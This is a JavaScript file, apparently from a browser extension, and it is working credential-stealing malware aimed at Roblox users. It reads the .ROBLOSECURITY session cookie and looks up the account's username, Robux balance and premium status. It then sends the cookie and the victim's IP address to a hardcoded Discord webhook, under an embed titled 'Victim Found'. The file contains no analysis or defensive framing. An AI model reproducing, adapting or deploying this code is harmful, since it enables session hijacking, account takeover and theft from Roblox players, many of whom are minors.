const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";

async function main(cookie) {
    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    if (cookie) {
        try {
            // ✅ New Roblox endpoint for authenticated user
            let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });

            if (res.ok) {
                let user = await res.json();

                // ✅ Get economy info (Robux balance)
                let economyRes = await fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
                    method: "GET",
                    headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                });
                let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A" };

                // ✅ Get premium status
                let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
                    method: "GET",
                    headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                });
                let isPremium = premiumRes.ok ? await premiumRes.json() : false;

                statistics = {
                    UserName: user.name,
                    RobuxBalance: economy.robux ?? "N/A",
                    IsPremium: isPremium,
                    ThumbnailUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=420&height=420&format=png`
                };
            }
        } catch (e) {
            console.error("Failed to fetch Roblox info:", e);
        }
    }

    // ✅ Send to Discord webhook
    fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            "content": null,
            "embeds": [
                {
                    "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                    "fields": [
                        {
                            "name": "Username",
                            "value": statistics ? statistics.UserName : "N/A",
                            "inline": true
                        },
                        {
                            "name": "Robux",
                            "value": statistics ? statistics.RobuxBalance : "N/A",
                            "inline": true
                        },
                        {
                            "name": "Premium",
                            "value": statistics ? statistics.IsPremium : "N/A",
                            "inline": true
                        }
                    ],
                    "author": {
                        "name": "Victim Found: " + ipAddr,
                        "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    },
                    "footer": {
                        "text": "https://github.com/ox-y",
                        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                    },
                    "thumbnail": {
                        "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    }
                }
            ],
            "username": "Roblox",
            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
        })
    });
}

chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
    main(cookie ? cookie.value : null);
});
